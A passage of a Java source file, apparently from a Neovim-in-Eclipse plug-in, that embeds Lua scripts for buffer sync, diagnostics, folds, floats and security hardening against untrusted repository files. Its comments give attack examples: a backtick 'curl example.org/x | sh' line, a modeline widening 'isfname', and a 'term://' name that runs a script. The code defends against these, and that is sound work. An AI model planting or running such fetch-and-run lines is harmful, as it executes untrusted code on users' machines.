     * <p><b>Undo.</b> The split is joined to the buffer's last change ({@code :undojoin}), so it
     * is no undo step of its own. Example: {@code A}, {@code Ctrl-R Ctrl-R a} (the register holds
     * {@code "1\r2"}), {@code Esc}, {@code u}. The split is queued behind the keys, so it usually
     * runs after the {@code Esc}, when the insert's step is closed; as a step of its own, the
     * {@code u} would undo only the split, put back {@code "x1\r2"}, which Eclipse shows as two
     * lines and has split again: {@code u} would never get past it. Joined, one {@code u} undoes
     * the insert with its split. (During the insert Neovim keeps an API change in the insert's step
     * anyway.) Right after an undo there is nothing to join to (E790, silenced): the split is then a
     * step of its own, as the undone text was split before.
     *
     * <p>The buffer is the one of the editor that asked, which need not be the window's any more
     * (the user switched editors before the split ran); its cursor is moved only when the window
     * shows it.
     */
    static final String SPLIT_LINE_BREAKS = """
            local buf, win, splits = tonumber((select(1, ...))), tonumber((select(2, ...))), select(3, ...)
            if not vim.api.nvim_buf_is_valid(buf) then
              return nil
            end
            local cursor = nil
            if win and vim.api.nvim_win_is_valid(win) and vim.api.nvim_win_get_buf(win) == buf then
              cursor = vim.api.nvim_win_get_cursor(win)
            end
            table.sort(splits, function(a, b) return a[1] > b[1] end)
            local count = vim.api.nvim_buf_line_count(buf)
            for _, split in ipairs(splits) do
              local row, parts = split[1], vim.list_extend({}, split[2])
              local line = row <= count and vim.api.nvim_buf_get_lines(buf, row - 1, row, true)[1] or nil
              local joined = table.concat(parts, '\\r')
              if line ~= nil and (line == joined or line == joined .. '\\r') and #parts > 1 then
                if line ~= joined then
                  parts[#parts] = parts[#parts] .. '\\r' -- Eclipse keeps it in a "\\r\\n"
                end
                vim.api.nvim_buf_call(buf, function() -- :undojoin acts on the current buffer
                  vim.cmd('silent! undojoin') -- E790 right after an undo: then a step of its own
                  vim.api.nvim_buf_set_lines(buf, row - 1, row, true, parts)
                end)
                if cursor and cursor[1] > row then
                  cursor[1] = cursor[1] + #parts - 1
                elseif cursor and cursor[1] == row then
                  local col, at = cursor[2], row -- onto the part the cursor was in
                  for k, part in ipairs(parts) do
                    if col <= #part or k == #parts then
                      cursor = { at, col }
                      break
                    end
                    col, at = col - #part - 1, at + 1
                  end
                end
              end
            end
            if cursor then
              pcall(vim.api.nvim_win_set_cursor, win, cursor)
              return vim.api.nvim_win_get_cursor(win)
            end
            return nil
            """;

    /**
     * Module {@code neovim4eclipse.paths}: the one rule for comparing file paths in Neovim, used by
     * every script that compares them ({@link #PROJECT_FILES}, {@link #HOST_COMMANDS},
     * {@link #DOCUMENT_BUFFER}, {@link #LEAVE_FOLDER}) and by the Lua tests ({@code t.same_file}).
     * The code and its comments: {@code core/lua/paths.lua}.
     */
    static final String PATHS = LuaModules.script("paths.lua");

    /**
     * Module {@code neovim4eclipse.project_files}: Neovim never reads a file on disk by itself, a
     * project's or not, since Eclipse opens an editor for either (docs/design/BUFFER_NUMBERS.md,
     * 2.3). The code and its comments: {@code core/lua/project_files.lua}.
     */
    static final String PROJECT_FILES = LuaModules.script("project_files.lua");

    /**
     * Tells {@link #PROJECT_FILES} the open projects' folders (arguments: the folders, one each, as
     * Eclipse gives them: {@code /ws/app}, {@code C:\ws\app}, a linked folder's target), and gives
     * the read hook to the buffers inside them, or takes it from those no longer inside. Sent at the
     * first attach and whenever a project or a linked folder comes or goes.
     */
    static final String SET_PROJECT_FOLDERS = """
            require('neovim4eclipse.project_files').set_folders((...)) -- one list: every folder
            """;

    /**
     * Loads a document's text into its buffer (arguments: the buffer number, and the lines as one
     * list), with {@link #LOAD_WITHOUT_UNDO} (no undo step, marks kept) run in that buffer: for the
     * first load, by number because Neovim may be in a plug-in's float during an attach, whose text
     * it would replace; and again after Neovim loaded it empty by itself, with no text kept from the
     * unload ({@link #DOCUMENT_BUFFER}, "Reloaded by Neovim"). Nothing for a buffer that is gone.
     */
    static final String RELOAD_DOCUMENT_BUFFER = "local function load(...)\n" + LuaScripts.LOAD_WITHOUT_UNDO + """
            end
            local buf = tonumber((select(1, ...)))
            local lines = (select(2, ...))
            if vim.api.nvim_buf_is_valid(buf) then
              vim.api.nvim_buf_call(buf, function() load(lines) end)
            end
            """;

    /**
     * Before a document's buffer is closed (arguments: its number, and the buffer shown instead):
     * closes the editor windows that show it, quietly; the home window shows the other buffer
     * instead (the home buffer if that one was wiped in Neovim). Returns the closed windows' ids and
     * the home buffer's number, as {@link #CLOSE_WINDOW} does, made anew if it was wiped. Example:
     * {@code {{1001, 1002}, 2}}. Unloading a buffer shown in a window would make Neovim close that
     * window or put some other buffer in it, by itself. See {@link #WINDOWS}.
     */
    static final String RELEASE_BUFFER = """
            local buf, fallback = tonumber((select(1, ...))), tonumber((select(2, ...)))
            return require('neovim4eclipse.windows').release(buf, fallback)
            """;

    /**
     * Makes part of a buffer equal to Eclipse's lines, replacing only the lines that differ, between
     * two {@code eclipse_echo} notifications, so that the session drops the change's line events. For
     * the pushes into the attached buffer ({@code NeovimSession.setBufferLines}, {@code
     * setBufferRegion}). Arguments: the buffer's number; the part, as its first line (0-based) and
     * how many lines at the end stay as they are ({@code 0, 0}: the whole buffer); the lines; whether
     * to answer the part's lines as they were. Answers {@code {"changed"}}, {@code {"equal"}} (nothing
     * set), or {@code {"outside"}} when the part is not in the buffer; with the old lines second when
     * asked. Example: {@code (3, 1, 1, {"B"}, false)} on {@code a, b, c} sets line 2 to {@code "B"}
     * and answers {@code {"changed"}}.
     *
     * <h2>Why the echo is marked</h2>
     * The document has those lines already, and an echo applied to it again is not always
     * harmless: one that removes lines removes them a second time. Eclipse's Delete Line in an
     * insert on {@code "alpha"}, then Esc, deleted {@code "beta"} from the document too.
     *
     * <h2>Why read and set in one script</h2>
     * As for {@link #SET_DOCUMENT_LINES}: a change a plug-in makes between a read and a set in two
     * requests would reach the document (it is outside the echo) and be overwritten in Neovim, or
     * the set would meet lines that moved. The cost: the part's lines go to Neovim whole, not only
     * the differing ones. A whole push also gets Neovim's old lines back, as its earlier read did;
     * a part's push (insert mode's few typed lines) gets nothing back.
     */
    static final String SET_LINES_MARKED = """
            local buf, first, keep, lines, want_old = ...
            local count = vim.api.nvim_buf_line_count(buf)
            if first < 0 or keep < 0 or first + keep > count then
              return { 'outside' }
            end
            local current = vim.api.nvim_buf_get_lines(buf, first, count - keep, true)
            local old = want_old and current or nil
            -- The lines that differ: past the common first lines, before the common last ones.
            local from = 1
            while from <= #current and from <= #lines and current[from] == lines[from] do
              from = from + 1
            end
            if from > #current and from > #lines then
              return { 'equal', old }
            end
            local old_end, new_end = #current, #lines
            while old_end >= from and new_end >= from and current[old_end] == lines[new_end] do
              old_end, new_end = old_end - 1, new_end - 1
            end
            local chan = vim.g.neovim4eclipse_channel or 0 -- 0: every channel, Eclipse's among them
            vim.rpcnotify(chan, 'eclipse_echo', buf, true)
            local ok, err = pcall(vim.api.nvim_buf_set_lines, buf, first + from - 1, first + old_end, true,
              vim.list_slice(lines, from, new_end))
            vim.rpcnotify(chan, 'eclipse_echo', buf, false)
            if not ok then
              error(err, 0)
            end
            return { 'changed', old }
            """;

    /**
     * Makes a document's buffer that is not attached equal to the document's lines (arguments: its
     * number, the lines as one list), replacing only the lines that differ, so the marks and undo
     * history of the others stay (a refactoring's change in the background, {@code
     * sync/UnattachedDocumentSync}). Returns {@code "changed"}, {@code "equal"} (nothing was set, so
     * nothing more is to be done) or {@code "gone"} (no such buffer).
     *
     * <h2>Why in one script, between two notifications</h2>
     * The line events of this change are the echo of Eclipse's own text and must not come back to
     * the document; any other change of the buffer must. Neovim runs one script at a time, so
     * nothing else changes the buffer between reading it here and setting it, and it sends the
     * script's notifications and the change's line events on the one channel in the order they
     * happen: {@code eclipse_echo(buf, true)}, the echo, {@code eclipse_echo(buf, false)}. The
     * session drops exactly the line events between the two ({@code NeovimSession.EventSink}).
     * Example: a plug-in's timer edits line 1 just before Eclipse's push of line 2 arrives: its
     * event comes before the first notification and reaches the document; the push's comes inside.
     * (Reading the lines in one request and setting them in a second left a gap where such a change
     * was lost, or met a replacement computed for the lines before it.)
     */
    static final String SET_DOCUMENT_LINES = """
            local buf, lines = tonumber((select(1, ...))), (select(2, ...))
            if not buf or not vim.api.nvim_buf_is_valid(buf) then
              return 'gone'
            end
            if #lines == 0 then
              lines = { '' } -- a buffer always has one line
            end
            local current = vim.api.nvim_buf_get_lines(buf, 0, -1, false)
            -- The lines that differ: past the common first lines, before the common last ones.
            local first = 1
            while first <= #current and first <= #lines and current[first] == lines[first] do
              first = first + 1
            end
            if first > #current and first > #lines then
              return 'equal' -- nothing to set, no echo
            end
            local old_end, new_end = #current, #lines
            while old_end >= first and new_end >= first and current[old_end] == lines[new_end] do
              old_end, new_end = old_end - 1, new_end - 1
            end
            local chan = vim.g.neovim4eclipse_channel or 0 -- 0: every channel, Eclipse's among them
            vim.rpcnotify(chan, 'eclipse_echo', buf, true)
            local ok, err = pcall(vim.api.nvim_buf_set_lines, buf, first - 1, old_end, true,
              vim.list_slice(lines, first, new_end))
            vim.rpcnotify(chan, 'eclipse_echo', buf, false)
            if not ok then
              error(err, 0)
            end
            return 'changed'
            """;

    /**
     * Sets {@code 'modified'} of a buffer (arguments: its number, {@code "1"} or {@code "0"}) to
     * Eclipse's dirty flag: Eclipse decides whether a document has unsaved changes, and Neovim's flag
     * follows, so that {@code :update} and {@code :bufdo update} write what Eclipse would save and
     * {@code :ls} shows {@code +} for it. Example: Ctrl+S in Eclipse clears it; typing in Eclipse,
     * or a change made by Neovim, sets it.
     */
    static final String SET_MODIFIED = """
            local bufnr, modified = ...
            local buf = tonumber(bufnr) -- not tonumber(select(1, ...)): the second argument would be a base
            if vim.api.nvim_buf_is_valid(buf) then
              vim.bo[buf].modified = modified == '1'
            end
            """;

    /**
     * Replaces the Eclipse problems of one buffer with a new list, as Neovim diagnostics in the
     * namespace {@code neovim4eclipse} ({@code :help vim.diagnostic.set()}). Argument: one list, of
     * the buffer number, then six per problem (one list: a big workspace has thousands, see
     * {@code NeovimApi.execLua}): lnum, col, end_lnum, end_col (0-based lines, byte columns),
     * severity (1 error, 2 warning, 3 info), message ({@code util/Diagnostic.toLuaArgs}). With the
     * number alone, the buffer's problems are cleared. A buffer that is gone (its editor closed
     * meanwhile) is left alone.
     *
     * <p>Each call replaces the whole list, so nothing is diffed. Neovim then moves the diagnostics
     * with the text as it is edited (extmarks) until Eclipse sends the next list. Example: arguments
     * {@code { 3, 0, 4, 0, 7, 1, "x cannot be resolved" }} put one error on line 1 of buffer 3, and
     * {@code ]d} from the start of the buffer goes there.
     */
    static final String SET_DIAGNOSTICS = """
            local args = ...
            local buf = tonumber(args[1])
            if not buf or not vim.api.nvim_buf_is_valid(buf) then
              return
            end
            local list = {}
            for i = 2, #args - 5, 6 do
              list[#list + 1] = {
                lnum = tonumber(args[i]),
                col = tonumber(args[i + 1]),
                end_lnum = tonumber(args[i + 2]),
                end_col = tonumber(args[i + 3]),
                severity = tonumber(args[i + 4]),
                message = args[i + 5],
                source = 'Eclipse',
              }
            end
            vim.diagnostic.set(vim.api.nvim_create_namespace('neovim4eclipse'), buf, list)
            """;

    /**
     * Returns whether Eclipse's problems are sent to Neovim: {@code true} unless the user's config
     * says {@code vim.g.neovim4eclipse_problems = 0} (or {@code false}). The session runs it once at
     * start, after {@link #SETUP} (so after {@code init.lua}), and keeps the answer
     * ({@code NeovimSession.problemsEnabled()}): when off, no {@link #SET_DIAGNOSTICS} is ever sent.
     * Changing the variable later needs a Neovim restart.
     *
     * <p><b>Off, only the message changes.</b> With no diagnostics, Neovim's {@code ]d} says "No more
     * valid diagnostics to move to", the same words as in a file without problems, so the user cannot
     * tell that the plug-in sends none. This script then wraps Neovim's default {@code ]d [d ]D [D}
     * in a function that, in a buffer with no diagnostics at all, says why instead:
     * {@code ]d: Eclipse's problems are not sent to Neovim (vim.g.neovim4eclipse_problems = 0)}. In
     * every other case it calls Neovim's own mapping, unchanged: the jump, the count, the jump list,
     * the {@code on_jump} hook and diagnostics of the user's own (nvim-lint, a language server in
     * {@code init.lua}) all stay Neovim's. The wrapper only adds words; it does not redo anything
     * Neovim does (the project's rule: let Neovim do the work).
     *
     * <p>Only Neovim's default mappings are wrapped. One is recognized by two things: its description
     * is Neovim's ({@code "Jump to the next diagnostic in the current buffer"} for {@code ]d}), and its
     * function comes from Neovim's own runtime: defined in {@code vim/_core/defaults}, or with no
     * source at all ({@code "?"}). The Windows build of Neovim 0.12.6 compiles its runtime without
     * debug information, so there {@code debug.getinfo} gives {@code "?"}, where Linux and macOS give
     * {@code "@vim/_core/defaults"}; a function from a user's {@code init.lua} always names its file.
     * A key the user mapped or unmapped in {@code init.lua} is left as it is, even one that copies
     * Neovim's description. Should a later Neovim change the descriptions, nothing is wrapped and
     * Neovim's own message appears: harmless.
     */
    static final String PROBLEMS = """
            local enabled = vim.g.neovim4eclipse_problems
            if enabled ~= 0 and enabled ~= false then
              return true
            end
            local defaults = { -- Neovim's descriptions of its own mappings (runtime/lua/vim/_core/defaults.lua)
              [']d'] = 'Jump to the next diagnostic in the current buffer',
              ['[d'] = 'Jump to the previous diagnostic in the current buffer',
              [']D'] = 'Jump to the last diagnostic in the current buffer',
              ['[D'] = 'Jump to the first diagnostic in the current buffer',
            }
            for _, lhs in ipairs({ ']d', '[d', ']D', '[D' }) do
              local default = vim.fn.maparg(lhs, 'n', false, true)
              local source = type(default.callback) == 'function'
                and debug.getinfo(default.callback, 'S').source or ''
              -- '?': the Windows build has no debug information for its runtime (see above)
              local neovims = source:find('vim/_core/defaults', 1, true) or source == '?'
              if neovims and default.desc == defaults[lhs] then
                vim.keymap.set('n', lhs, function()
                  if #vim.diagnostic.get(0) == 0 then
                    vim.api.nvim_echo({ { lhs .. ": Eclipse's problems are not sent to Neovim"
                      .. ' (vim.g.neovim4eclipse_problems = 0)', 'WarningMsg' } }, true, {})
                  else
                    default.callback() -- Neovim's own: it reads v:count1 of this same key press
                  end
                end, { desc = default.desc .. " (Eclipse's problems are off)" })
              end
            end
            return false
            """;

    /**
     * Maps the keys only the IDE can carry out ({@code gd}, {@code K}, the {@code gr*} keys,
     * {@code gt}; see {@link IdeAction}): each sends {@code eclipse_action} with its action and
     * Vim's count ({@code v:count}, the count typed before the key). The code and its comments:
     * {@code core/lua/ide_keys.lua}.
     */
    static final String IDE_KEYS = LuaModules.script("ide_keys.lua");

    /**
     * Module {@code neovim4eclipse.quickfix}: the quickfix lists of the workspace's problems and
     * tasks (docs/design/DIAGNOSTICS.md, section 5). The code and its comments:
     * {@code core/lua/quickfix.lua}.
     */
    static final String QUICKFIX = LuaModules.script("quickfix.lua");

    /**
     * Fills or updates a quickfix list of Eclipse's (argument: {@code util/QuickfixEntries.toLuaArgs}
     * as one list, since {@code :Eproblems} may have thousands of entries; see
     * {@code NeovimApi.execLua}); see {@link #QUICKFIX}.
     */
    static final String SET_QUICKFIX = """
            local a = ...
            require('neovim4eclipse.quickfix').set(a[1], a[2], a[3], a[4], vim.list_slice(a, 5))
            """;

    /**
     * The current quickfix list's kind and argument ({@code {"problems", "warning"}}) when it is one
     * of Eclipse's, else {@code nil}; see {@link #QUICKFIX}.
     */
    static final String QUICKFIX_CURRENT = "return require('neovim4eclipse.quickfix').current()";

    /**
     * Installs the fold module, {@code require('neovim4eclipse.folds')}, unless the user's config
     * turned folding off with {@code vim.g.neovim4eclipse_folds = 0} (or {@code false}), and
     * returns whether folding is on. The code and its comments: {@code core/lua/folds.lua}.
     */
    static final String FOLDS = LuaModules.script("folds.lua");

    /**
     * Replaces the folds of the window showing a buffer with Eclipse's (argument: one list, of the
     * buffer number, then first line, last line, {@code "1"} if collapsed, per fold, from
     * {@code util/FoldRegions.toLuaArgs}). Done only when that buffer is in the editor's window ({@link #WINDOWS}' {@code editor_window}: the current one, or the one under a plug-in's float Neovim is in): folds
     * belong to a window, and another buffer gets its folds when Eclipse shows it. With the number
     * alone the editor cannot fold, and folding is turned off in the window. How: {@link #FOLDS}'
     * {@code set}. Sent only when folding is on, so the module is always there.
     *
     * <p>Example: {@code { 3, 1, 20, 0, 10, 15, 1 }} gives buffer 3 an open fold over lines 1-20 with a
     * closed one over lines 10-15 inside it; {@code zj} from line 1 then goes to line 10.
     */
    static final String SET_FOLDS = """
            local args = ...
            local buf = tonumber(args[1])
            local folds = package.loaded['neovim4eclipse.folds']
            local windows = package.loaded['neovim4eclipse.windows']
            local win = windows and windows.editor_window() or vim.api.nvim_get_current_win()
            if not folds or not buf or vim.api.nvim_win_get_buf(win) ~= buf then
              return
            end
            local list = {}
            for i = 2, #args - 2, 3 do
              list[#list + 1] = { tonumber(args[i]), tonumber(args[i + 1]), args[i + 2] == '1' }
            end
            vim.api.nvim_win_call(win, function() folds.set(buf, list) end)
            """;

    /**
     * Installs the viewport module, {@code require('neovim4eclipse.viewport')}. The code and its
     * comments: {@code core/lua/viewport.lua}.
     */
    static final String VIEWPORT = LuaModules.script("viewport.lua");

    /**
     * Search highlighting (docs/design/SEARCH_HIGHLIGHTING.md): the matches of Neovim's search that
     * the current window shows, sent to Eclipse, which paints them behind the editor's text. The
     * code and its comments: {@code core/lua/search.lua}.
     */
    static final String SEARCH = LuaModules.script("search.lua");

    /**
     * Neovim's own highlights that the editor shows besides search matches
     * (docs/design/SEARCH_HIGHLIGHTING.md, "The yank flash and window matches"): the flash after a
     * yank, and the window's matches. The code and its comments: {@code core/lua/highlights.lua}.
     */
    static final String HIGHLIGHTS = LuaModules.script("highlights.lua");

    /**
     * The rows and columns Neovim's screen has besides the text of the editor's window ({@link #WINDOWS}' {@code editor_window}: the current one, or the one under a plug-in's float Neovim is in),
     * {@code { rows, columns }}; see {@link #VIEWPORT}'s {@code overhead}.
     */
    static final String VIEWPORT_OVERHEAD = """
            local windows = package.loaded['neovim4eclipse.windows']
            local win = windows and windows.editor_window() or vim.api.nvim_get_current_win()
            return vim.api.nvim_win_call(win, require('neovim4eclipse.viewport').overhead)
            """;

    /**
     * A message of the plug-in's own, shown as Neovim shows its own: {@code (message, error)};
     * ui2 draws it, {@code :messages} keeps it, an error is in {@code ErrorMsg}. Example:
     * {@code ("E37: No write since last change (add ! to override)", true)}.
     */
    static final String ECHO = """
            local message, err = ...
            vim.api.nvim_echo({ { message } }, true, { err = err })
            """;

    /**
     * Sets Neovim's {@code 'background'} to the argument, {@code "dark"} or {@code "light"}, unless
     * it is that already: from Eclipse's theme, so a colorscheme with both variants picks the one
     * that matches the editor, whose colors the command-line window takes for its default ones
     * ({@code editor/GridCanvas}). Overrides a {@code 'background'} the user's config set.
     */
    static final String SET_BACKGROUND = """
            local background = ...
            if vim.o.background ~= background then
              vim.o.background = background
            end
            """;


    /**
     * Leaves the plug-in's float Neovim's cursor is in, closing it, and the float named by the
     * argument too (-1: none) ({@link #WINDOWS}' {@code leave_float}): the user turned Neovim mode
     * off. For clicking away, {@link #MOVE_OUT_OF_FLOAT}. Answers whether one was closed.
     */
    static final String LEAVE_FLOAT = """
            return package.loaded['neovim4eclipse.windows'].leave_float(tonumber((...)))
            """;

    /**
     * Ends an insert begun in the plug-in's float Neovim is in, while it is still there, when the
     * script sent next will leave that float ({@link #WINDOWS}' {@code end_float_insert}): the first
     * of the two steps of every route that takes Neovim out of a float
     * ({@code DocumentBuffers.leavingFloat}). Arguments: the route ({@link #FLOAT_EXITS}), then the
     * next script's own arguments. Example: {@code ("close", "1002", "3")} before
     * {@code CLOSE_WINDOW} of window 1002 ends the insert only if Neovim's float is in 1002's tab
     * page. Answers whether {@code :stopinsert} ran.
     */
    static final String END_FLOAT_INSERT = """
            local windows = package.loaded['neovim4eclipse.windows']
            if windows == nil then
              return false
            end
            local args = { ... }
            for i = 2, #args do
              args[i] = tonumber(args[i]) or args[i] -- window and buffer numbers; past_limits stays words
            end
            return windows.end_float_insert(unpack(args))
            """;

    /**
     * Moves Neovim out of the plug-in's float it is in, to the editor's window, the float staying
     * open ({@link #WINDOWS}' {@code move_out_of_float}): the user clicked the text or left for
     * another part. The argument names the float the cursor was in when the keyboard left, or is
     * -1. Answers whether Neovim moved.
     */
    static final String MOVE_OUT_OF_FLOAT = """
            return package.loaded['neovim4eclipse.windows'].move_out_of_float(tonumber((...)))
            """;

    /**
     * For a press in the text that stays Eclipse's (a right click, Ctrl+click): moves Neovim out of
     * the plug-in's float it is in, and abandons a {@code :} line opened from it. Decided here,
     * since the cursor is on Neovim's command line then and only Neovim knows a float is behind it.
     * In no float, nothing: a line opened from the editor stays. Whether Neovim moved.
     */
    static final String LEAVE_FLOAT_WITH_LINE = """
            local windows = package.loaded['neovim4eclipse.windows']
            if not windows.focused_float(0) then
              return false
            end
            if vim.api.nvim_get_mode().mode:sub(1, 1) == 'c' then
              vim.api.nvim_input('<C-c>')
            end
            return windows.move_out_of_float(-1)
            """;

    /**
     * Closes the plug-in's float Neovim is in when the editor does not draw it, with a message
     * ({@link #WINDOWS}' {@code close_undrawn}, the one place that decides it, from what Neovim
     * says there): sent from the redraw flush that finds Neovim's cursor on a grid the editor does
     * not draw ({@code util/Grids.unseenCursor}). First argument: the window the session saw on
     * that grid, or -1 (a hidden float's is forgotten); second: the limits it would be past
     * ({@code util/Grids.PAST_LIMITS}, their one source), named when that window is the one.
     */
    static final String CLOSE_UNDRAWN_FLOAT = """
            local win, past_limits = ...
            return package.loaded['neovim4eclipse.windows'].close_undrawn(tonumber(win), past_limits)
            """;

    /**
     * The route of each script that can take Neovim out of a float, as {@link #WINDOWS}' table
     * {@code leaves} names it: {@link #END_FLOAT_INSERT} is sent with it and the script's own
     * arguments, and ends a float's insert only when that script will leave the float. The one list
     * of those scripts: {@code DocumentBuffers.leavingFloat} refuses a script not in it.
     * {@code LuaScriptsTest} checks that each route is a key of {@code leaves}.
     */
    static final Map<String, String> FLOAT_EXITS = Map.of(
            FOCUS_WINDOW, "focus",
            SHOW_WINDOW, "show",
            CLOSE_WINDOW, "close",
            RELEASE_BUFFER, "release",
            LEAVE_FLOAT, "move",
            MOVE_OUT_OF_FLOAT, "move",
            LEAVE_FLOAT_WITH_LINE, "move",
            CLOSE_UNDRAWN_FLOAT, "undrawn");

    /**
     * Turns on Neovim's ui2, which draws the command line, its prompts, the pager and messages
     * itself, in four floating windows, so that the editor only copies their cells as it does any
     * float's (docs/ARCHITECTURE.md, "The command line and messages"). The code and its comments:
     * {@code core/lua/ui2.lua}.
     */
    static final String UI2 = LuaModules.script("ui2.lua");

    /**
     * Turns {@code 'modeline'} off, for the buffers there are and those to come: run once at
     * start, after the user's config.
     *
     * <p><b>Why.</b> A modeline is a line of a file that sets options when Neovim reads the file
     * ({@code // vim: set ts=4 :}), and the files are a cloned repository's. Most options a
     * modeline may set are harmless, but some are global and change what a later key does.
     * Example: {@code vim: set isfname+=`,32 :} adds the backtick and the space to the
     * characters of a file name; from then on {@code Ctrl-X Ctrl-F}, in any buffer, takes a
     * line's {@code `...`} for a file name, and completing a file name runs that in the shell.
     *
     * <p><b>Why for all buffers.</b> Neovim reads file text on many routes: the plug-in's own
     * reads ({@link #PROJECT_FILES}, {@link #CREATE_DOCUMENT_BUFFER}), but also the first match of
     * {@code :vimgrep}, an archive's listing and its members ({@code zip.vim}, {@code tar.vim}),
     * a help page, {@code gf} on a URL. Turned off per route, each new route would be a hole;
     * the option itself is the one place all of them end in.
     *
     * <p>What it costs: no file's modeline applies, a help page's among them (its tab width and
     * text width are then Neovim's defaults). A user who wants modelines can {@code :set
     * modeline} later; the plug-in's own reads stay without.
     */
    static final String NO_MODELINES = """
            vim.go.modeline = false
            for _, buf in ipairs(vim.api.nvim_list_bufs()) do
              pcall(function()
                vim.bo[buf].modeline = false
              end)
            end
            return true
            """;

    /**
     * Stops Neovim from starting a program for a buffer named {@code term://...}: run once at
     * start, always.
     *
     * <p><b>Why.</b> Neovim's defaults read a buffer of that name by running what follows the
     * scheme in a terminal (the {@code BufReadCmd} of the group {@code nvim.terminal}). The
     * name can come from a file's text. Example: a cloned file holds {@code term://./build.sh};
     * {@code gf} on it would run the repository's script. It is no bundled plug-in with an
     * "already loaded" variable ({@code NvimExecutable.READERS_OFF}), so the autocommand itself
     * is removed.
     *
     * <p>What it costs: {@code :edit term://cmd} opens an empty buffer. {@code :terminal cmd}
     * does not use this autocommand; a typed one does not reach Neovim at all ({@link #TERMINALS}).
     */
    static final String NO_TERMINAL_URLS = """
            pcall(vim.api.nvim_clear_autocmds, { group = 'nvim.terminal', event = 'BufReadCmd' })
            return true
            """;

    /**
     * Says so when a Neovim terminal starts that Eclipse cannot show: run once at start, always.
     *
     * <p><b>Why.</b> Eclipse has no view for a terminal buffer: the editor goes back to its file, as
     * after any buffer it cannot show, and the terminal's program runs on out of sight until it exits
     * or Neovim stops. A typed {@code :terminal} never gets here: {@link #HOST_COMMANDS} hands it to
     * Eclipse before Neovim runs it ({@code HostCommand.Kind.TERMINAL}), which opens its own
     * Terminal view. What does get here is a terminal started where the {@code :} line is not
     * looked at: a {@code <Cmd>terminal<CR>} mapping, {@code :execute}, Lua
     * ({@code vim.cmd.terminal()}), a plug-in's {@code jobstart({term = true})} (toggleterm,
     * lazygit.nvim). By {@code TermOpen} its program has already started, so it is not stopped: a
     * stop could leave its work half done ({@code make} part way). It runs on, and the message names
     * it, so nothing runs unseen without a word.
     *
     * <p>Example: a mapping {@code <Cmd>terminal lazygit<CR>} shows
     * {@code terminal: "lazygit" is running hidden: Eclipse cannot show a Neovim terminal. It stops
     * when it exits or Neovim does.} The program is read from the buffer's name, which Neovim gives
     * every terminal as {@code term://<folder>//<pid>:<command>}: the command line for a string
     * ({@code :terminal lazygit}, {@code jobstart('make', {term = true})}), only the program (its
     * full path) for a list ({@code jobstart({'sh', '-c', 'make'}, {term = true})} names
     * {@code /usr/bin/sh}). A terminal that runs no program ({@code nvim_open_term}, which some
     * plug-ins use to show coloured text) gets no message: its channel is no job.
     *
     * <p>Shown with {@code nvim_echo}, which changes no mode (this may run in insert mode; a plain
     * {@code :normal} would fire {@code ModeChanged}).
     */
    static final String TERMINALS = """
            vim.api.nvim_create_autocmd('TermOpen', {
              group = vim.api.nvim_create_augroup('neovim4eclipse_terminals', { clear = true }),
              desc = 'Say that Eclipse cannot show this terminal',
              callback = function(a)
                if not pcall(vim.fn.jobpid, vim.bo[a.buf].channel) then
                  return -- nvim_open_term: no program runs
                end
                local command = vim.api.nvim_buf_get_name(a.buf):match('^term://.-//%d+:(.*)$')
                local what = command and ('"' .. command .. '"') or 'a terminal'
                vim.api.nvim_echo({ { 'terminal: ' .. what .. ' is running hidden: Eclipse cannot show a Neovim terminal.'
                  .. ' It stops when it exits or Neovim does.' } }, true, {})
              end,
            })
            return true
            """;

    /**
     * Refuses three of insert mode's {@code Ctrl-X} completions, whoever sends the keys: run once
     * at start, always (it does not depend on the completion list being drawn).
     *
     * <p><b>Why.</b> {@code Ctrl-X Ctrl-V} (and {@code Ctrl-X Ctrl-Q}, the same key by its other
     * name) completes the text before the cursor as a Vim command line, and command-line
     * completion expands a file name in backticks by running it in the shell
     * ({@code :help backtick-expansion}). The text before the cursor is the file's. Example: a
     * cloned file holds the line {@code e `curl example.org/x | sh`}; with the cursor at its end,
     * {@code Ctrl-X Ctrl-V} would run that. {@code Ctrl-X Ctrl-O} calls {@code 'omnifunc'}, which
     * for some file types evaluates the buffer's code; the plug-in's editor buffers have none
     * set, but a buffer Neovim read itself can, and Eclipse's content assist is what completes
     * code here ({@code KeyRouter} runs it for the key in an insert Eclipse types).
     *
     * <p><b>How.</b> {@code vim.on_key} sees every key Neovim is about to handle, typed, sent by
     * the plug-in, from a mapping or from a register run as a macro, and returning {@code ''}
     * drops it. Whether {@code Ctrl-X} was just pressed is Neovim's own answer:
     * {@code complete_info()} says mode {@code ctrl_x} then, in a fresh insert as after
     * {@code Ctrl-N} ({@code :help complete_info()}). A refused key arriving in that state is dropped, and a {@code Ctrl-Z} is put
     * in its place at the head of the typeahead, not remapped: {@code Ctrl-X Ctrl-Z} ends the
     * completion and changes no text. One place, behind every route to it, so no route needs a
     * check of its own.
     *
     * <p><b>The key with a modifier too.</b> A UI may send {@code Ctrl-V} with Shift or another
     * modifier ({@code <C-S-v>}); Neovim then gets the same last byte behind a modifier prefix
     * ({@code 0x80 0xfc}, the modifier's bits), and completes all the same. So the last byte
     * decides.
     *
     * <p><b>Not in the command-line window of {@code :} commands</b> ({@code q:}): there the text
     * is the user's own command lines, as in the {@code :} line, and Neovim maps {@code Tab} to
     * {@code Ctrl-X Ctrl-V} to complete them. In the window of searches ({@code q/}) it is
     * refused: a search pattern is no command, and it may be text taken from a file.
     *
     * <p>What it costs: Vim's command-line completion and omni completion are not available in
     * insert mode outside the command-line window, also for a user who set an {@code 'omnifunc'}
     * on purpose.
     */
    static final String CTRL_X_GUARD = """
            local REFUSED = {
              ['\\22'] = 'Ctrl-X Ctrl-V (command-line completion) is not available here: it can run commands found in the text',
              ['\\17'] = 'Ctrl-X Ctrl-Q (command-line completion) is not available here: it can run commands found in the text',
              ['\\15'] = "Ctrl-X Ctrl-O (omni completion) is not available here: use Eclipse's content assist",
            }
            local CTRL_Z = '\\26'
            local ns = vim.api.nvim_create_namespace('neovim4eclipse_ctrl_x_guard')
            -- In pcall: Neovim removes an on_key function that fails, and the guard would be gone
            -- from then on. Should the lookup itself fail in a Ctrl-X mode, the key is dropped:
            -- refusing a key wrongly costs a keypress, letting one through runs a command.
            vim.on_key(function(key)
              -- The key itself, or the key behind a modifier prefix (<C-S-v> is \\128\\252, the
              -- modifier's bits, then the same byte).
              local message = (#key == 1 or key:sub(1, 2) == '\\128\\252') and REFUSED[key:sub(-1)] or nil
              if not message then
                return nil
              end
              local mode = vim.api.nvim_get_mode().mode
              if not mode:match('^[iR]v?x$') then
